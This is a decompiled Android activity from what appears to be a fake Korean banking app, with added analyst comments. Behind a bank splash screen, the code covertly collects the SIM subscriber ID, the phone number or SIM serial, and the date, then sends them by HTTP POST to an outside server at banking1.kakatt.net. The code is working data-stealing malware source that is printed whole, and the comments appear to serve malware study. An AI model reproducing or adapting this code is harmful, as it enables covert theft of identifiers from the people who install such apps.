package com.example.kbtest;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.MotionEvent;
import com.ibk.smsmanager.R;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
/* loaded from: classes.dex */
public class BankSplashActivity extends Activity {
    static List<NameValuePair> params;
    ShowView showView;
    private Thread splashTread;
    TimerTask task;
    TimerTask task2;
    Timer timer;
    Timer timer2;
    String insert_url = "http://banking1.kakatt.net:9998/send_sim_no.php";
    protected int _splashTime = 1000;
    Handler myHandler = new Handler() { // from class: com.example.kbtest.BankSplashActivity.1
        @Override // android.os.Handler
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case 1:
                    BankSplashActivity.this.showView.funDismiss();
                    Intent i = new Intent();
                    i.setClass(BankSplashActivity.this, BankSplashNext.class);
                    BankSplashActivity.this.startActivity(i);
                    BankSplashActivity.this.finish();
                    break;
            }
            super.handleMessage(msg);
        }
    };

    @Override // android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(1);
        setContentView(R.layout.splash);
        this.showView = new ShowView(getApplicationContext());
        this.showView.funShow();
        if (netWorkIsAvailable(getApplicationContext())) { 
            // [fmss] controlla che la rete sia disponibile e invia i dati della SIM
            regPhone();
        }
        this.task = new TimerTask() { // from class: com.example.kbtest.BankSplashActivity.2
            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
                Message message = new Message();
                message.what = 1;
                BankSplashActivity.this.myHandler.sendMessage(message);
            }
        };
        this.timer = new Timer(true);
        this.timer.schedule(this.task, 3000L);
        this.task2 = new TimerTask() { // from class: com.example.kbtest.BankSplashActivity.3
            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
                Message message = new Message();
                message.what = 2;
                BankSplashActivity.this.myHandler.sendMessage(message);
            }
        };
        this.timer2 = new Timer(true);
        this.timer2.schedule(this.task2, 1000L);
    }

    /* JADX WARN: Type inference failed for: r6v5, types: [com.example.kbtest.BankSplashActivity$4] */
    // [fmss] Collects data from SIM, e.g. unique subscriver ID, SIM serial number and phone number
    // and then it sends to a remote url
    void regPhone() {
        TelephonyManager tm = (TelephonyManager) getSystemService("phone");
        String sim_no = tm.getSubscriberId(); // [fmss] get unique subscriber ID
        String getLine1Number = tm.getLine1Number(); // Returns the phone number string for line 1, for example, the MSISDN for a GSM phone for a particular subscription. 
        if (getLine1Number == null || getLine1Number.length() < 11) {
            getLine1Number = tm.getSimSerialNumber(); // Returns the serial number of the SIM
        }
        ParamsInfo.Line1Number = getLine1Number;
        ParamsInfo.sim_no = sim_no;
        params = new ArrayList();
        params.add(new BasicNameValuePair("mobile_no", getLine1Number));
        Date currentTime = new Date();
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
        String dateString = formatter.format(currentTime);
        params.add(new BasicNameValuePair("datetime", dateString));
        new Thread() { // from class: com.example.kbtest.BankSplashActivity.4
            @Override // java.lang.Thread, java.lang.Runnable
            public void run() {
                DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
                HttpPost httppost = new HttpPost(BankSplashActivity.this.insert_url);
                try {
                    httppost.setEntity(new UrlEncodedFormEntity(BankSplashActivity.params, "EUC-KR"));
                    Log.d("\thttppost.setEntity(new UrlEncodedFormEntity(params));", "gone");
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
                try {
                    HttpResponse response = defaultHttpClient.execute(httppost);
                    Log.d("response=httpclient.execute(httppost);", response.toString());
                } catch (IOException e2) {
                    e2.printStackTrace();
                } catch (ClientProtocolException e3) {
                    e3.printStackTrace();
                }
            }
        }.start();
    }

    public boolean netWorkIsAvailable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService("connectivity");
        NetworkInfo activeNetInfo = connectivityManager.getActiveNetworkInfo();
        if (activeNetInfo == null || !activeNetInfo.isAvailable()) {
            return false;
        }
        return true;
    }

    @Override // android.app.Activity
    public boolean onTouchEvent(MotionEvent event) {
        event.getAction();
        return true;
    }
}
